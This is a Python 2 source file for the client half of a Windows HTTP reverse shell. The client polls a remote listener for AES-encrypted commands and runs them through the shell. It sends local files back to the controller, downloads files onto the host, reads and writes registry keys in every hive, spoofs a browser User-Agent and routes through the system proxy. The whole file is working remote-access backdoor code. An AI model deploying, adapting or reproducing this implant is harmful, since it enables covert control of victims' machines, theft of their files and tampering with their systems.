#!/usr/bin/python2

import subprocess
import sys
import base64
import os
import requests
import time
import _winreg
from Crypto.Cipher import AES


usage_error = """Incorrect usage!
Usage: 	./client_shell_http.py [remotehost] [remoteport]
Example: ./client_shell_http.py 172.168.135.1 80
or
Usage: 	./client_shell_http.py [remotehost] [remoteport] [proxyhost] [proxyport] 
Example: ./client_shell_http.py 172.168.135.1 80 127.0.0.1 8080
or
Usage: 	./client_shell_http.py [remotehost] [remoteport] [proxyhost] [proxyport] [proxyusername] [proxypassword]
Example: ./client_shell_http.py 172.168.135.1 80 127.0.0.1 8080 username p@ssw0rd
"""

# set basic headers
headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
	"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}

#####################################
#Encryption Part
BLOCK_SIZE = 32 # block size for AES
# for padding, plaintext must be a multiple of the blocksize
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

#secret squirrel
secret = 'Go30@Fe04*1@9dg+-_;s~j2dfsv^,z2='
cipher = AES.new(secret)


def encryption(stuff):
	stuff = EncodeAES(cipher, stuff) # encrypt data with AES
	stuff = base64.b64encode(stuff) # encode stdout data
	return stuff #value

def decryption(stuff):
	stuff = base64.b64decode(stuff) # encode stdout data
	value = DecodeAES(cipher, stuff) # decrypt data with AES
	return value
##################################

def set_reg(info):
	try:
		HKEY = str(info[2])
		REG_PATH = str(info[3])
		name = str(info[4])
		value = str(info[5])
		
		if HKEY == 'HKEY_CURRENT_USER':
			_winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
			registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)
			_winreg.SetValueEx(registry_key, name, 0, _winreg.REG_SZ, str(value))
			_winreg.CloseKey(registry_key)
			output = HKEY+' '+REG_PATH+' '+name+' has been changed to '+value
			return output
		elif HKEY == 'HKEY_CLASSES_ROOT':
			_winreg.CreateKey(_winreg.HKEY_CLASSES_ROOT, REG_PATH)
			registry_key = _winreg.OpenKey(_winreg.HKEY_CLASSES_ROOT, REG_PATH, 0, _winreg.KEY_WRITE)
			_winreg.SetValueEx(registry_key, name, 0, _winreg.REG_SZ, str(value))
			_winreg.CloseKey(registry_key)
			output = HKEY+' '+REG_PATH+' '+name+' has been changed to '+value
			return output
		elif HKEY == 'HKEY_LOCAL_MACHINE':
			_winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE, REG_PATH)
			registry_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0, _winreg.KEY_WRITE)
			_winreg.SetValueEx(registry_key, name, 0, _winreg.REG_SZ, str(value))
			_winreg.CloseKey(registry_key)
			output = HKEY+' '+REG_PATH+' '+name+' has been changed to '+value
			return output
		elif HKEY == 'HKEY_USERS':
			_winreg.CreateKey(_winreg.HKEY_USERS, REG_PATH)
			registry_key = _winreg.OpenKey(_winreg.HKEY_USERS, REG_PATH, 0, _winreg.KEY_WRITE)
			_winreg.SetValueEx(registry_key, name, 0, _winreg.REG_SZ, str(value))
			_winreg.CloseKey(registry_key)
			output = HKEY+' '+REG_PATH+' '+name+' has been changed to '+value
			return output
		elif HKEY == 'HKEY_CURRENT_CONFIG':
			_winreg.CreateKey(_winreg.HKEY_CURRENT_CONFIG, REG_PATH)
			registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_CONFIG, REG_PATH, 0, _winreg.KEY_WRITE)
			_winreg.SetValueEx(registry_key, name, 0, _winreg.REG_SZ, str(value))
			_winreg.CloseKey(registry_key)
			output = HKEY+' '+REG_PATH+' '+name+' has been changed to '+value
			return output
		else:
			return "HKEY does not exist"

	except WindowsError:
		return False

def get_reg(info):
	try:

		HKEY = str(info[2])
		REG_PATH = str(info[3])
		name = str(info[4])
		
		if HKEY == 'HKEY_CURRENT_USER':
			registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0,_winreg.KEY_READ)
			value, regtype = _winreg.QueryValueEx(registry_key, name)
			_winreg.CloseKey(registry_key)
			return value
		elif HKEY == 'HKEY_CLASSES_ROOT':
			registry_key = _winreg.OpenKey(_winreg.HKEY_CLASSES_ROOT, REG_PATH, 0,_winreg.KEY_READ)
			value, regtype = _winreg.QueryValueEx(registry_key, name)
			_winreg.CloseKey(registry_key)
			return value
		elif HKEY == 'HKEY_LOCAL_MACHINE':
			registry_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0,_winreg.KEY_READ)
			value, regtype = _winreg.QueryValueEx(registry_key, name)
			_winreg.CloseKey(registry_key)
			return value
		elif HKEY == 'HKEY_USERS':
			registry_key = _winreg.OpenKey(_winreg.HKEY_USERS, REG_PATH, 0,_winreg.KEY_READ)
			value, regtype = _winreg.QueryValueEx(registry_key, name)
			_winreg.CloseKey(registry_key)
			return value
		elif HKEY == 'HKEY_CURRENT_CONFIG':
			registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_CONFIG, REG_PATH, 0,_winreg.KEY_READ)
			value, regtype = _winreg.QueryValueEx(registry_key, name)
			_winreg.CloseKey(registry_key)
			return value
		else:
			return "HKEY does not exist"

	except WindowsError:
		return None

winreg_error = """******Incorrect usage of the winreg command.******
Usage set:	winreg,set,[HKEY],"[REG_PATH]",[REG_NAME],[value]
Example:	winreg,set,HKEY_CURRENT_USER,control panel\mouse,mousesensitivity,7
				or
Usage read: winreg,read,[HKEY],[REG_PATH],[REG_NAME]
Example:	winreg,read,HKEY_CURRENT_USER,control panel\mouse,mousesensitivity
"""

def func(x):
	try:
		return int(x)
	except ValueError:
		return x

def no_proxyFunction(address, port, addr):
	while True:
		req = requests.get(url=addr) #% (address) #, port)
		command = req.text
		command = decryption(command)

		####################################################
		if 'quit' in command or 'exit' in command:
			break
		####################################################
		elif command[:8] == 'download':
			try:
				grab, path = command.split(' ')
		
				if os.path.exists(path): 
					url = addr + "/!download!" #% (address)
					files = {'file': open(path, 'rb')} # dict with key 'file'
					r = requests.post(url, files=files)
				else:
					msg = '[-] Not able to find the file'
					senddata = encryption(msg)
					post_response = requests.post(url=addr, data=senddata) #% (address)
			except IOError as e:
				error ="Error " + str(e.errno) + ": Filename not found: download" 
				senddata = encryption(error)
				post_response = requests.post(url=addr, data=senddata)
		####################################################
		elif command[:6] == 'upload':
			try:
				
				grab, path = command.split(' ')
				url = addr + "/" + path #% (address)
				r = requests.get(url, stream=True)

				with open(path, 'wb+') as f:
					for chunk in r.iter_content(chunk_size=1024):
						if chunk:
							f.write(decryption(chunk))
	
			except Exception as e:
				error ="Error " + str(e.errno) + " up"
				error = encryption(error)
				post_response = requests.post(url=addr, data=error)
		####################################################
		elif command[:2] == 'cd':
			try:
				os.chdir(command[3:])
			except OSError as e:
				print e.errno
				direc = "Error " + str(e.errno) + ": Directory Name not found"
				direc = encryption(direc)
				post_response = requests.post(url=addr, data=direc)
		####################################################
		elif command[:6] == 'winreg':
			command = str(command)
			array = [func(x) for x in command.split(",")]
			try:
				if len(array) == 5 and array[1] == 'read':
					reg = get_reg(array)
					reg = encryption(reg)
					post_response = requests.post(url=addr, data=reg)
	
				elif len(array) == 6 and array[1] == 'set':
					reg = set_reg(array)
					reg = encryption(reg)
					post_response = requests.post(url=addr, data=reg)
				else:
					error = encryption(winreg_error)
					post_response = requests.post(url=addr, data=error)
			except Exception as e:
				print e
		####################################################
		else:

			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			resp1 = encryption(CMD.stdout.read())
			resp2 = encryption(CMD.stderr.read())
			post_response = requests.post(url=addr, data=resp1)#, proxies=proxies) #% (address)
			post_response = requests.post(url=addr, data=resp2)#, proxies=proxies) #% (address)
	
		time.sleep(3)

def proxyFunction(address, port, addr, proxy_addr, proxy_port):
	while True:
		proxyDict = { 	'http://%s' % (address): "http://%s:%d" % (proxy_addr, proxy_port),
						'https://%s' % (address): "https://%s:%d" % (proxy_addr, proxy_port),
						'ftp://%s' % (address): "ftp://%s:%d" % (proxy_addr, proxy_port)
					}

		req = requests.get(addr, headers=headers, proxies=proxyDict) #% (address) #, port) , headers=headers
		command = req.text
		command = decryption(command)

		####################################################
		if 'quit' in command or 'exit' in command:
			break
		####################################################
		elif command[:8] == 'download':
			try:
				grab, path = command.split(' ')
		
				if os.path.exists(path): 
					url = addr + "/!download!" #% (address)
					files = {'file': open(path, 'rb')} # dict with key 'file'
					r = requests.post(url, files=files, proxies=proxyDict)
				else:
					msg = '[-] Not able to find the file'
					senddata = encryption(msg)
					post_response = requests.post(url=addr, data=senddata, proxies=proxyDict) #% (address)
			except IOError as e:
				error ="Error " + str(e.errno) + ": Filename not found: download" 
				senddata = encryption(error)
				post_response = requests.post(url=addr, data=senddata, proxies=proxyDict)
		####################################################
		elif command[:6] == 'upload':
			try:
				
				grab, path = command.split(' ')
				url = addr + "/" + path #% (address)
				r = requests.get(url, stream=True, proxies=proxyDict)

				with open(path, 'wb+') as f:
					for chunk in r.iter_content(chunk_size=1024):
						if chunk:
							f.write(decryption(chunk))
	
			except Exception as e:
				error ="Error " + str(e.errno) + " up"
				error = encryption(error)
				post_response = requests.post(url=addr, data=error, proxies=proxyDict)
		####################################################
		elif command[:2] == 'cd':
			try:
				os.chdir(command[3:])
			except OSError as e:
				print e.errno
				direc = "Error " + str(e.errno) + ": Directory Name not found"
				direc = encryption(direc)
				post_response = requests.post(url=addr, data=direc, proxies=proxyDict)
		####################################################
		elif command[:6] == 'winreg':
			command = str(command)
			array = [func(x) for x in command.split(",")]
			try:
				if len(array) == 5 and array[1] == 'read':
					reg = get_reg(array)
					reg = encryption(reg)
					post_response = requests.post(url=addr, data=reg, proxies=proxyDict)
	
				elif len(array) == 6 and array[1] == 'set':
					reg = set_reg(array)
					reg = encryption(reg)
					post_response = requests.post(url=addr, data=reg, proxies=proxyDict)
				else:
					error = encryption(winreg_error)
					post_response = requests.post(url=addr, data=error, proxies=proxyDict)
			except Exception as e:
				print e
		####################################################
		else:

			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			resp1 = encryption(CMD.stdout.read())
			resp2 = encryption(CMD.stderr.read())
			post_response = requests.post(url=addr, data=resp1, proxies=proxyDict)#, proxies=proxies) #% (address)
			post_response = requests.post(url=addr, data=resp2, proxies=proxyDict)#, proxies=proxies) #% (address)
	
		time.sleep(3)

def main():
	try:
		if len(sys.argv) == 3:
			address = sys.argv[1] # reverse listener ip address
			port = int(sys.argv[2])
			addr = "http://" + str(address)
			regcheck1 = r"winreg,read,HKEY_CURRENT_USER,Software\Microsoft\Windows\CurrentVersion\Internet Settings,ProxyEnable"
			array1 = [func(x) for x in regcheck1.split(",")]
			response = get_reg(array1)
			
			if response == 1:
				regcheck2 = r"winreg,read,HKEY_CURRENT_USER,Software\Microsoft\Windows\CurrentVersion\Internet Settings,ProxyServer"
				array2 = [func(x) for x in regcheck2.split(",")]
				proxy = get_reg(array2)
				temp1, temp2 = proxy.split(":")
				proxy_addr = str(temp1)
				proxy_port = int(temp2)
				proxyFunction(address, port, addr, proxy_addr, proxy_port)
			else:
				no_proxyFunction(address, port, addr);
		
		elif len(sys.argv) == 5:
			address = sys.argv[1] # reverse listener ip address
			port = int(sys.argv[2])
			addr = "http://" + str(address)
			proxy_addr = str(sys.argv[3])
			proxy_port = int(sys.argv[4])
			proxyFunction(address, port, addr, proxy_addr, proxy_port)	

		elif len(sys.argv) == 7:
			address = sys.argv[1] # reverse listener ip address
			port = int(sys.argv[2])
			addr = "http://" + str(address)
			proxy_addr = str(sys.argv[3])
			proxy_port = int(sys.argv[4])
			proxy_user = str(sys.argv[5])
			proxy_pass = str(sys.argv[6])
			#auth = requests.auth.HTTPProxyAuth(proxy_user, proxy_pass)
			#proxyDict = { 	'http': "http://%s:%d" % (proxy_addr, proxy_port),
			#				'https': "https://%s:%d" % (proxy_addr, proxy_port),
			#				'ftp': "ftp://%s:%d" % (proxy_addr, proxy_port)
			#			}
			#proxyFunctionAuth(address, port, addr, proxy_addr, proxy_port, auth)
			print "Sorry, cannot resolve proxies with authentication... yet"
		else:
			print usage_error
			sys.exit(0)
	
	except (IndexError, Exception, KeyboardInterrupt):
		print "Stopping connection."
		sys.exit(0)

main()
